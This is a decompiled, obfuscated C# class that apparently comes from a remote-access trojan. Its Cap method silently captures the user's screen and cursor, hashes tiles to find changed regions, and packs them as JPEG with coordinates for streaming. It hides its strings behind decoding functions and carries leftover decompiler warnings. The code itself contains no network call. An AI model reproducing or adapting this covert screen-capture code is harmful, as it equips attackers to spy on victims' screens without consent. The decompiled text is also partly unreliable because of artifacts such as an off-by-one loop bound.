using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace O;

public class GClass3
{
	private static int int_0 = 0;

	private static int int_1 = 0;

	private static int int_2 = 0;

	private static Bitmap bitmap_0 = new Bitmap(1, 1);

	private static List<Point> list_0 = new List<Point>();

	private static List<Bitmap> list_1 = new List<Bitmap>();

	public static void Clear()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		int_1 = -1;
		int_0 = -1;
		int_2 = -1;
		bitmap_0 = new Bitmap(1, 1);
	}

	private static ImageCodecInfo smethod_0(string string_0)
	{
		ImageCodecInfo[] array = Class11.smethod_15(580, 'ȿ');
		int num = array.Length;
		int num2 = 0;
		while (true)
		{
			if (num2 <= num)
			{
				if (Class11.smethod_7(array[num2].get_MimeType(), string_0, bool_0: false, '\u0013', '+') == 0)
				{
					break;
				}
				num2 = checked(num2 + 1);
				continue;
			}
			return null;
		}
		return array[num2];
	}

	private static string smethod_1(byte[] byte_0)
	{
		byte_0 = new MD5CryptoServiceProvider().ComputeHash(byte_0);
		return Convert.ToBase64String(byte_0);
	}

	private static Image smethod_2(int int_3 = 0, int int_4 = 0, bool bool_0 = true)
	{
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		int width = Screen.get_PrimaryScreen().get_Bounds().Width;
		Rectangle rectangle_ = Screen.get_PrimaryScreen().get_Bounds();
		int num = Class11.smethod_16(ref rectangle_, 955, 966);
		Bitmap val = new Bitmap(width, num);
		Graphics val2 = (Graphics)(IDisposable)Class14.smethod_8<Image>((Image)(object)val, (short)553, 569);
		val2.set_CompositingQuality((CompositingQuality)1);
		int width2 = Screen.get_PrimaryScreen().get_Bounds().Width;
		rectangle_ = Screen.get_PrimaryScreen().get_Bounds();
		Class4.smethod_5<Graphics>(val2, 0, 0, 0, 0, new Size(width2, Class11.smethod_16(ref rectangle_, 216, 165)), (CopyPixelOperation)13369376, 842, 'Ͳ');
		if (bool_0)
		{
			try
			{
				Class12.smethod_12(601, 'ɮ').Draw(val2, new Rectangle(Cursor.get_Position(), new Size(32, 32)));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		val2.Dispose();
		if (int_3 == 0 && int_4 == 0)
		{
			return (Image)(object)val;
		}
		return (Image)(object)(MarshalByRefObject)(object)((Image)val).GetThumbnailImage(int_3, int_4, (GetThumbnailImageAbort)null, default(IntPtr));
	}

	public static byte[] Cap(int q, int co, int Qu)
	{
		//IL_01d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e3: Expected O, but got Unknown
		//IL_024b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0252: Expected O, but got Unknown
		//IL_027f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0286: Expected O, but got Unknown
		//IL_0451: Unknown result type (might be due to invalid IL or missing references)
		//IL_047b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0613: Unknown result type (might be due to invalid IL or missing references)
		//IL_061a: Expected O, but got Unknown
		//IL_089d: Unknown result type (might be due to invalid IL or missing references)
		//IL_08a4: Expected O, but got Unknown
		//IL_08b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_08b9: Expected O, but got Unknown
		Size size_ = new Size((Point)smethod_3(q));
		checked
		{
			size_.Width = GForm1.smethod_3(GClass1.smethod_3(GClass1.smethod_1(Class3.smethod_7(ref size_, 796, 886).ToString(), 1, GClass2.DRV.smethod_1(Class3.smethod_7(ref size_, 452, 430).ToString(), 858, 772) - 1, 438, 499), Class14.smethod_3(0, '\u031c', '\u0304'), 217, 156), 273, 324);
			size_.Height = GForm1.smethod_3(GClass1.smethod_3(GClass1.smethod_1(Class3.smethod_8(ref size_, 617, 544).ToString(), 1, GClass2.DRV.smethod_1(Class3.smethod_8(ref size_, 624, 569).ToString(), 763, 677) - 1, 896, 965), Class14.smethod_3(0, 'Ϫ', 'ϲ'), 968, 909), 964, 913);
			Size size_2 = Class4.smethod_7<Image>((Image)(object)bitmap_0, (short)332, (short)271);
			if ((Class3.smethod_7(ref size_2, 168, 194) != Class3.smethod_7(ref size_, 688, 730)) | (Class3.smethod_9<Image>((Image)(object)bitmap_0, (short)1021, 956) != Class3.smethod_8(ref size_, 215, 158)) | (int_0 != co) | (int_2 != Qu))
			{
				list_1.Clear();
				list_0.Clear();
				bitmap_0 = new Bitmap(Class3.smethod_7(ref size_, 899, 1001), Class3.smethod_8(ref size_, 609, 552));
			}
			int_1 = q;
			int_0 = co;
			int_2 = Qu;
			List<Bitmap> list = new List<Bitmap>();
			List<Point> list2 = new List<Point>();
			Bitmap val;
			if (list_1.Count > 0)
			{
				list.AddRange(list_1.ToArray());
				list_1.Clear();
				list2.AddRange(list_0.ToArray());
				list_0.Clear();
				val = (Bitmap)(Image)bitmap_0;
			}
			else
			{
				val = (Bitmap)smethod_2(Class3.smethod_7(ref size_, 579, 553), Class3.smethod_8(ref size_, 654, 711));
				int num = Class3.smethod_7(ref size_, 367, 261);
				int num2 = Class3.smethod_8(ref size_, 691, 762);
				int num3 = co - 1;
				for (int i = 0; i <= num3; i++)
				{
					int num4 = co - 1;
					for (int j = 0; j <= num4; j++)
					{
						int y = (int)GForm1.smethod_10((double)num2 / (double)co * (double)i, 'ϫ', 'Ϛ');
						int x = (int)GForm1.smethod_10((double)num / (double)co * (double)j, 'ǵ', 'Ǆ');
						int width = (int)GForm1.smethod_10((double)num / (double)co, '\u030d', '\u033c');
						int height = (int)GForm1.smethod_10((double)num2 / (double)co, 'Ŷ', 'Ň');
						if (width.ToString().Contains(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1f3", 62469), 58298), 63173)))
						{
							width = GForm1.smethod_3(GClass2.DRV.smethod_7(Class14.smethod_3(width, 'ˋ', '\u02d3'), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1f3", 62469), 58298), 63173), -1, (CompareMethod)0, 'Β', 'Θ')[0], 622, 571);
						}
						if (height.ToString().Contains(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1f3", 62469), 58298), 63173)))
						{
							height = GForm1.smethod_3(GClass2.DRV.smethod_7(Class14.smethod_3(height, 'Ő', 'ň'), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1f3", 62469), 58298), 63173), -1, (CompareMethod)0, '\u0306', '\u030c')[0], 112, 37);
						}
						MemoryStream memoryStream = new MemoryStream();
						Bitmap val2 = Class11.smethod_17<Bitmap>(val, new Rectangle(x, y, width, height), ((Image)val).get_PixelFormat(), 'ρ', 'ϩ');
						Bitmap gparam_ = Class11.smethod_17<Bitmap>(bitmap_0, new Rectangle(x, y, width, height), ((Image)val).get_PixelFormat(), 'ɜ', 'ɴ');
						Class12.smethod_13<Stream, Image, ImageFormat>((Image)(object)val2, (Stream)memoryStream, ImageFormat.get_Jpeg(), '\u008c', (short)211);
						byte[] byte_ = Class11.smethod_8(memoryStream, 'ǔ', 483);
						Class12.smethod_7((Stream)memoryStream, (short)462, 509);
						memoryStream = new MemoryStream();
						Class12.smethod_13<Stream, Image, ImageFormat>((Image)(object)gparam_, (Stream)memoryStream, ImageFormat.get_Jpeg(), 'Ǵ', (short)427);
						byte[] byte_2 = Class11.smethod_8(memoryStream, 'Û', 236);
						Class12.smethod_7((Stream)memoryStream, (short)375, 324);
						if (Class11.smethod_7(smethod_1(byte_), smethod_1(byte_2), bool_0: false, 'a', 'Y') == 0)
						{
							Class4.smethod_8<Image>((Image)(object)val2, (short)891, (short)859);
						}
						else
						{
							list.Add(val2);
							list2.Add(new Point(x, y));
						}
						Class4.smethod_8<Image>((Image)(object)gparam_, (short)736, (short)704);
					}
				}
			}
			if (list.Count == 0)
			{
				return new byte[1];
			}
			int num5 = 0;
			List<int> list3 = new List<int>();
			int num6 = (int)GForm1.smethod_10((double)(co * co) / 5.0, 'ɻ', 'Ɋ');
			for (int k = 0; k <= num6 && k != list.Count; k++)
			{
				list3.Add(k);
				num5 += Class3.smethod_9<Image>((Image)(object)list[k], (short)538, 603);
			}
			Bitmap val3 = new Bitmap(Class5.smethod_13<Image>((Image)(object)list[0], 880, 780), num5);
			Graphics val4 = Class14.smethod_8<Image>((Image)(object)val3, (short)35, 51);
			int num7 = 0;
			string text = (string)(IEnumerable)Class4.smethod_0(Class14.smethod_3(Class5.smethod_13<Image>((Image)(object)val, 336, 300), '\u009f', '\u0087'), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1f3", 62469), 58298), 63173), Class14.smethod_3(Class3.smethod_9<Image>((Image)(object)val, (short)746, 683), 'ʏ', 'ʗ'), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uee03", 59581), 59501), 61000), 516, 605);
			foreach (int item in list3)
			{
				string[] obj = new string[7] { text, null, null, null, null, null, null };
				Point point_ = list2[item];
				obj[1] = Class14.smethod_3(Class11.smethod_18(ref point_, 'ǰ', 504), 'ϛ', 'σ');
				obj[2] = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1f3", 62469), 58298), 63173);
				point_ = list2[item];
				obj[3] = Conversions.ToString(Class11.smethod_18(ref point_, 'ψ', 961));
				obj[4] = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1f3", 62469), 58298), 63173);
				obj[5] = Conversions.ToString(((Image)list[item]).get_Height());
				obj[6] = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uee03", 59581), 59501), 61000);
				text = (string)(IEnumerable)string.Concat(obj);
				val4.DrawImage((Image)(object)list[item], 0, num7);
				num7 += ((Image)list[item]).get_Height();
			}
			text = (string)(IEnumerable)(text + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("瀞瀞者益瀞瀞", 62656), 58107), 60576));
			int num8 = list.Count - 1;
			for (int l = 0; l <= num8; l++)
			{
				if (!list3.Contains(l))
				{
					list_1.Add(list[l]);
					list_0.Add(list2[l]);
				}
			}
			val4.Dispose();
			MemoryStream memoryStream2 = new MemoryStream();
			EncoderParameters val5 = new EncoderParameters(1);
			val5.get_Param()[0] = new EncoderParameter(Encoder.Quality, unchecked((long)Qu));
			ImageCodecInfo val6 = smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf82e\uf82a\uf826\uf820\uf822\uf868\uf82d\uf837\uf822\uf820", 59235), 60901), 62174));
			((Image)val3).Save((Stream)memoryStream2, val6, val5);
			MemoryStream memoryStream3 = new MemoryStream();
			memoryStream3.Write(Encoding.Default.GetBytes(text), 0, text.Length);
			memoryStream3.Write(memoryStream2.ToArray(), 0, (int)memoryStream2.Length);
			bitmap_0 = val;
			((Image)val3).Dispose();
			return memoryStream3.ToArray();
		}
	}

	private static Size smethod_3(int int_3)
	{
		int width = Screen.get_PrimaryScreen().get_Bounds().Width;
		Rectangle rectangle_ = Screen.get_PrimaryScreen().get_Bounds();
		Size size_ = new Size(width, Class11.smethod_16(ref rectangle_, 93, 32));
		checked
		{
			switch (int_3)
			{
			case 0:
				return size_;
			case 1:
				size_.Width = (int)GForm1.smethod_10((double)Class3.smethod_7(ref size_, 772, 878) / 1.1, 'Ț', 'ȫ');
				size_.Height = (int)GForm1.smethod_10((double)Class3.smethod_8(ref size_, 265, 320) / 1.1, 'ϔ', 'ϥ');
				break;
			case 2:
				size_.Width = (int)GForm1.smethod_10((double)Class3.smethod_7(ref size_, 620, 518) / 1.3, 'ȼ', 'ȍ');
				size_.Height = (int)GForm1.smethod_10((double)Class3.smethod_8(ref size_, 874, 803) / 1.3, '\u00a0', '\u0091');
				break;
			case 3:
				size_.Width = (int)GForm1.smethod_10((double)Class3.smethod_7(ref size_, 451, 425) / 1.5, '\u0087', '¶');
				size_.Height = (int)GForm1.smethod_10((double)Class3.smethod_8(ref size_, 580, 525) / 1.5, '\a', '6');
				break;
			case 4:
				size_.Width = (int)GForm1.smethod_10((double)Class3.smethod_7(ref size_, 529, 635) / 1.9, 'ö', 'Ç');
				size_.Height = (int)GForm1.smethod_10((double)Class3.smethod_8(ref size_, 936, 993) / 1.9, '\u02fe', 'ˏ');
				break;
			case 5:
				size_.Width = (int)GForm1.smethod_10((double)Class3.smethod_7(ref size_, 965, 943) / 2.0, 'Α', 'Π');
				size_.Height = (int)GForm1.smethod_10((double)Class3.smethod_8(ref size_, 1017, 944) / 2.0, 'Ȍ', 'Ƚ');
				break;
			case 6:
				size_.Width = (int)GForm1.smethod_10((double)Class3.smethod_7(ref size_, 346, 304) / 2.1, '\u030b', '\u033a');
				size_.Height = (int)GForm1.smethod_10((double)Class3.smethod_8(ref size_, 39, 110) / 2.1, 'ư', 'Ɓ');
				break;
			case 7:
				size_.Width = (int)GForm1.smethod_10((double)Class3.smethod_7(ref size_, 31, 117) / 2.2, 'Ĳ', 'ă');
				size_.Height = (int)GForm1.smethod_10((double)Class3.smethod_8(ref size_, 958, 1015) / 2.2, 'į', 'Ğ');
				break;
			case 8:
				size_.Width = (int)GForm1.smethod_10((double)Class3.smethod_7(ref size_, 1012, 926) / 2.5, '\u0006', '7');
				size_.Height = (int)GForm1.smethod_10((double)Class3.smethod_8(ref size_, 998, 943) / 2.5, 'â', 'Ó');
				break;
			case 9:
				size_.Width = (int)GForm1.smethod_10((double)Class3.smethod_7(ref size_, 511, 405) / 3.0, 'Ð', 'á');
				size_.Height = (int)Math.Round((double)size_.Height / 3.0);
				break;
			case 10:
				size_.Width = (int)Math.Round((double)size_.Width / 3.5);
				size_.Height = (int)Math.Round((double)size_.Height / 3.5);
				break;
			case 11:
				size_.Width = (int)Math.Round((double)size_.Width / 4.0);
				size_.Height = (int)Math.Round((double)size_.Height / 4.0);
				break;
			case 12:
				size_.Width = (int)Math.Round((double)size_.Width / 5.0);
				size_.Height = (int)Math.Round((double)size_.Height / 5.0);
				break;
			case 13:
				size_.Width = (int)Math.Round((double)size_.Width / 6.0);
				size_.Height = (int)Math.Round((double)size_.Height / 6.0);
				break;
			}
			size_.Width = Conversions.ToInteger(Strings.Mid(size_.Width.ToString(), 1, size_.Width.ToString().Length - 1) + Conversions.ToString(0));
			size_.Height = Conversions.ToInteger(Strings.Mid(size_.Height.ToString(), 1, size_.Height.ToString().Length - 1) + Conversions.ToString(0));
			return size_;
		}
	}
}
